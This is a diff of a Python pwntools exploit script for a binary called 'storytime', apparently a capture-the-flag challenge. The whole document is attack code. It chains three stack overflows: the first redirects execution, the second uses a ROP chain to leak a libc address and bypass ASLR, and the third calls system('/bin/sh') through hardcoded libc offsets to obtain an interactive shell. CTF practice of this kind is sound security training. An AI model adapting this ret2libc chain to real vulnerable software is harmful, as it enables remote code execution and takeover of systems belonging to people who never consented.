@@ -1,33 +1,28 @@
 from pwn import *
 
-# Load Context, binary, libc
+# Load Environment
 context.terminal = ['tmux','splitw' ,'-h']
 binary = ELF("./storytime")
-#libc = ELF("./libc.so.6")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+#libc = ELF("")
+env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
 
-#p = process("./storytime")
-p = gdb.debug("./storytime", '''
-break main
-break *0x40069c
-''')
-
-# one_gadget
-execve = 0x45216
-execve2 = 0xcbcc0
+p = process("./storytime", env=env)
+#p = gdb.debug("./storytime", '''
+#break main
+#break *0x40069c
+#''', env=env)
 
 main = 0x40062e
 climax = 0x40060e
-end_write_plt = 0x4005f1a + 21
-middle_write_plt = 0x4005d4
-beginning_write_plt = 0x4005b7
 write_plt = 0x40067b
+beg_write_plt = 0x4005cc
 read_plt_got = 0x601020
 pop_rdi = 0x400703
 pop_rsi = 0x400701 # pop_rsi ; popr15 ; ret
-push_r15 = 0x4006a0
 
 
+##############################################################################
+# 1st Overflow - This crash is dead end. Jump to climax() for 2nd overflow.
 payload = ''
 payload += 'A' * 56
 payload += p64(climax)
@@ -35,8 +30,9 @@ payload += p64(climax)
 p.sendline(payload)
 
 
-
-# Climax() overflow
+##############################################################################
+# Climax()  - The 2nd overflow
+# Leak Information - Bypass ASLR
 payload2 = ''
 payload2 += 'A' * 56
 payload2 += p64(pop_rdi)
@@ -44,20 +40,38 @@ payload2 += p64(0x1)
 payload2 += p64(pop_rsi)
 payload2 += p64(read_plt_got)
 payload2 += p64(0x0)
-payload2 += p64(end_write_plt)
-payload2 += p64(main)
+payload2 += p64(beg_write_plt)
+payload2 += 'B' * 8
+payload2 += p64(main) # ret to main() for final exploit
 
 p.recv()
 p.sendline(payload2)
 
 # libc() read leak
 leak = int(p.recv(6)[::-1].encode('hex'),16)
-print "libc read() leak: ", hex(leak)
+print "libc_read leak: ", hex(leak)
 
-#libc_base = leak - 978464
-#print "libc base: ", hex(libc_base)
+# __libc_start_main() leak
+libc_main = leak - 879376
+print "libc_start_main leak: ", hex(libc_main)
 
-#libc_system = leak - 679984
-#print "libc system(): ", hex(libc_system)
+# __libc_system() leak
+libc_system = libc_main + 150608
+print "libc_system leak: ", hex(libc_system)
 
+# libc string: '/bin/sh'
+binsh = libc_main + 1492503
+
+
+##############################################################################
+# 3rd Overflow - The Exploit
+# ROP + ['/bin/sh' in libc] + libc_system
+payload3 = ''
+payload3 += 'A' * 56
+payload3 += p64(pop_rdi)
+payload3 += p64(binsh)
+payload3 += p64(libc_system)
+
+p.recv()
+p.sendline(payload3)
 p.interactive()
